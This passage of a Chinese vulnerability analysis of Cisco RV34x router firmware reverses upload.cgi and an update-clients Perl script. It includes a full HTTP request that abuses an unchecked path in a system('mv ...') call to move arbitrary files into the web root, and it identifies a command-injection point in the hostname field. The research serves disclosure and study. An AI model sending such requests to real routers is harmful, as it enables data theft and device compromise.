    cgi = /www/cgi-bin/upload.cgi
    cgi-allowed-ext = .cgi
    cgi-allowed-ext = .pl
    cgi-timeout = 300
    ignore-sigpipe = true
从上面的描述中我们可以知道现在具备的能力是无条件访问`/www/cgi-bin/upload.cgi`的能力，下面逆向`/www/cgi-bin/upload.cgi`，来看是如何实现任意文件移动的。
将`upload.cgi`拖入到IDA当中，可以看到它先在环境变量中获取数据，然后调用[multipart-parser-c](https://github.com/iafonov/multipart-parser-c)库来解析上传的数据包，解析完成后调用`prepare_file`来预处理上传的文件。
    int __fastcall main(int a1, char **a2, char **a3)
    {
      ...
      content_length_ptr = (int)getenv("CONTENT_LENGTH");
      content_type_ptr = getenv("CONTENT_TYPE");
      request_uri_ptr = getenv("REQUEST_URI");
      http_cookie_ptr = getenv("HTTP_COOKIE");
      ...
      callbacks.on_header_value = read_header_name;
      callbacks.on_part_data = read_header_value;
      json_obj = json_object_new_object();
      ...
      parser = multipart_parser_init(boundary_ptr, &callbacks);
      length = strlen(content_buf_ptr);
      multipart_parser_execute(parser, content_buf_ptr, length);
      multipart_parser_free(parser);
      jsonutil_get_string(json_obj, &filepath_ptr, "\"file.path\"", -1);
      jsonutil_get_string(json_obj, &filename_ptr, "\"filename\"", -1);
      jsonutil_get_string(json_obj, &pathparam_ptr, "\"pathparam\"", -1);
      jsonutil_get_string(json_obj, &fileparam_ptr, "\"fileparam\"", -1);
      jsonutil_get_string(json_obj, &destination_ptr, "\"destination\"", -1);
      jsonutil_get_string(json_obj, &option_ptr, "\"option\"", -1);
      jsonutil_get_string(json_obj, &cert_name_ptr, "\"cert_name\"", -1);
      jsonutil_get_string(json_obj, &cert_type_ptr, "\"cert_type\"", -1);
      jsonutil_get_string(json_obj, &password_ptr, "\"password\"", -1);
      ...
      local_fileparam_ptr = StrBufToStr(local_fileparam_buf);
      ret_code = prepare_file(pathparam_ptr, filepath_ptr, local_fileparam_ptr);
跟进去`prepare_file`函数，可以看到该函数会进行文件移动操作，参数`file.path`当作源文件路径，根据`pathparam`的类型设置目的文件夹并与`fileparam`当做目的文件名进行拼接最终作为目的路径。实现的方式是调用`system`，参数是`"mv
-f %s
%s/%s"`，可以看到目的文件名进行了参数的校验，源文件只判断了文件是否存在，因此这个地方该参数使得我们可以移动任意的文件，当类型我们设置为`Portal`的时候，目的文件夹是
类型是`Portal`的时候，会把目的文件夹设置为`/tmp/www`，因为我们最终可以实现的效果是可以将任意文件移动到`/tmp/www`目录文件夹下。
    int __fastcall prepare_file(const char *type, const char *src, const char *dst)
    {
      ...
      if ( !strcmp(type, "Firmware") )
      {
        target_dir = "/tmp/firmware";
      }
      ...
      else
      {
        if ( strcmp(type, "Portal") )
          return -1;
        target_dir = "/tmp/www";
      }
      if ( !is_file_exist(src) )
        return -2;
      if ( strlen(src) > 0x80 || strlen(dst) > 0x80 )
        return -3;
      if ( match_regex("^[a-zA-Z0-9_.-]*$", dst) )
        return -4;
      sprintf(s, "mv -f %s %s/%s", src, target_dir, dst);
      debug("cmd=%s", s);
      ...
      ret_code = system(s);
利用该漏洞最直接的效果就是可以将一些敏感文件移动到`/tmp/www`目录下然后访问该路径，实现敏感信息泄露，更深层次的利用在后续分析中说明。
下面的请求包可以实现将`/tmp/upload/0000000001`移动到`/tmp/www/bak`
    POST /form-file-upload HTTP/1.1
    Host: 192.168.1.1
    Cookie: selected_language=English; session_timeout=false; sessionid=2727f44696347c5e1218c78a2471f1c48ab9e6f4a9c3b3b6ab1db9a1365fd620; user=cisco; blinking=1; config-modified=1; disable-startup=0; redirect-admin=0; group=admin; attributes=RW; ru=0; bootfail=0; model_info=RV345; fwver=1.0.03.24; current-page=Admin_Config_Management
    Content-Length: 626
    Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
    Accept: application/json, text/plain, */*
    Optional-Header: header-value
    Sec-Ch-Ua-Mobile: ?0
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBtdH1UtBT6GPZrcM
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    Sec-Ch-Ua-Platform: "macOS"
    Origin: https://192.168.1.1
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://192.168.1.1/index.html
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Connection: close
    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM
    Content-Disposition: form-data; name="sessionid"
    2727f44696347c5e1218c78a
    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM
    Content-Disposition: form-data; name="pathparam"
    Portal
    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM
    Content-Disposition: form-data; name="file.path"
    /tmp/upload/0000000001
    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM
    Content-Disposition: form-data; name="fileparam"
    bak
    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM
    Content-Disposition: form-data; name="websession"; filename="a.xml"
    Content-Type: text/xml
    {
    }
    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM--
### 认证后命令执行漏洞
最后是一个认证后命令执行漏洞，漏洞存在于`/usr/bin/update-clients`中。
可以看到在`update-clients`中，参数`$name`可以实现注入。
    #!/usr/bin/perl
    my $total = $#ARGV + 1;
    my $counter = 1;
    #$mac  = "FF:FF:FF:FF:FF:FF";
    #$name = "TestPC";
    #$type = "Computer";
    #$os   = "Windows";
    foreach my $a(@ARGV)
    {
        if (($counter%12) == 0)
        {
            system("lcstat dev set $mac \"$name\" \"$type\" \"$os\" > /dev/null");
        }
        elsif (($counter%12) == 4)
        {
            $mac = $a
        }
        elsif (($counter%12) == 6)
        {
            $name = $a
        }
        elsif (($counter%12) == 8)
        {
            $type = $a
        }
        elsif (($counter%12) == 10)
        {
            $os = $a
        }
        $counter++;
    }
这里要搞清楚的是`http`请求包是怎么跑到`/usr/bin/update-clients`去执行的。
`RV34x`系列采用的是`ConfD`的架构来进行网络管理的，ConfD是[tail-f](https://www.tail-f.com/)推出的配置管理开发框架，提供多种工具，针对多种标准，其中也包括了对NETCONF/YANG的支持。Tail-f已经被思科收购，所以ConfD应该说是思科的ConfD了。根据官方手册[ConfD User
Guide](https://manuals.plus/wp-content/sideloads/software-tail-f-confd-user-guide-original.pdf)，它的架构如下。基础知识前面已经说过，可以去了解`netconf+yang`模型的网络管理。
`CDB`是内置的数据库，由`xml`表示，被`ConfD`解析后提供多个接口以实现多客户端的访问。对于`RV34x`系列来说，配置文件的路径是`/etc/confd/cdb/`，该目录下的`xml`便是配置的数据。比较关注的是`config_init.xml`，该配置文件里面存储了包含用户密码等信息在内的数据。
接口模型使用`yang`定义，`yang`是一种数据建模语言，下面给出部分关键字的解释，当然也可以从[ConfD User
Guide](https://manuals.plus/wp-content/sideloads/software-tail-f-confd-user-guide-original.pdf)中去了解更多的信息：
  * `module`定义了一种分层的配置树结构。它可以使能`NETCONF`的所有功能，如配置操作(`operation`)，`RPC`和异步通知(`notification`)。开发者可根据配置数据的语义来定义不同的`module`。
  * `namespace`用于唯一的标识`module`，等同于`xml`文件中的`namespace`。
  * `container`节点把相关的子节点组织在一起。
  * `list`节点可以有多个实例，每个实例都有一个`key`唯一标识。
  * `leaf`是叶子节点，具有数据类型和值，如叶子结点`name`的数据类型(`type`)是`string`，它唯一的表示`list`节点`interface`。
下面我们看下关于漏洞点的`rpc`调用的`yang`的定义：
        // /etc/confd/yang/ciscosb-avc.yang: 197
            rpc update-clients {
            input {
                list clients {
                    key mac;
                    leaf mac {
                        type yang:mac-address;
                        mandatory true;
                    }
                    leaf hostname {
                        type string;
                    }
                    leaf device-type {
                        type string;
                    }
                    leaf os-type {
                        type string;
                    }
                }
            }
        }
        augment "/ciscosb-ipgroup:ip-groups/ciscosb-ipgroup:ip-group/ciscosb-ipgroup:ips" {
            uses ciscosb-security-common:DEVICE-OS-TYPE;
        }
        augment "/ciscosb-ipgroup:ip-groups/ciscosb-ipgroup:ip-group/ciscosb-ipgroup:macs" {
            uses ciscosb-security-common:DEVICE-OS-TYPE;
        }
可以看到上面定义了类似于下面的`json`数据请求包，`hostname`、`device-type`以及`os-type`都是`leaf`结点，类型（`type`）也是字符串（`string`）。
    POST /jsonrpc HTTP/1.1
    Host: 127.0.0.1:8080
    Accept: application/json, text/plain, */*
    Content-Length: 350
    Connection: close
    Cookie: selected_language=English; user=cisco; blinking=1; config-modified=1; disable-startup=0; redirect-admin=0; group=admin; attributes=RW; ru=0; bootfail=0; model_info=RV345; fwver=1.0.03.24; session_timeout=false; sessionid=138b633ddd844b81a8ea48a149819f645fbe31fb64a1bd7cc0072f3d14420da0; current-page=WAN_Settings
    {
      "jsonrpc":"2.0",
      "method":"action",
      "params":{
        "rpc":"update-clients",
        "input":{
          "clients": [
            {
              "hostname": "rv34x",
              "mac": "64:d1:a3:4f:be:e1",
              "device-type": "client",
              "os-type": "windows"
            }
          ]
        }
      }
    }
`yang`数据接口的定义在路径`/etc/confd/yang`目录下，它被`confdc`编译成`.fxs`文件输出到了`/etc/confd/fxs`当中，后续这些`.fxs`文件被`confd`解析使用。
现在基本搞清楚了漏洞触发的原因，现在从细节实现上来看请求的数据包是如何触发`rpc`请求的。
`nginx`的配置文件中定义了`/jsonrpc`的请求路径，可以看到它处理的`uwsgi_pass`是`jsonrpc`
    # /etc/nginx/conf.d/web.conf: 18
    location = /jsonrpc {
        include uwsgi_params;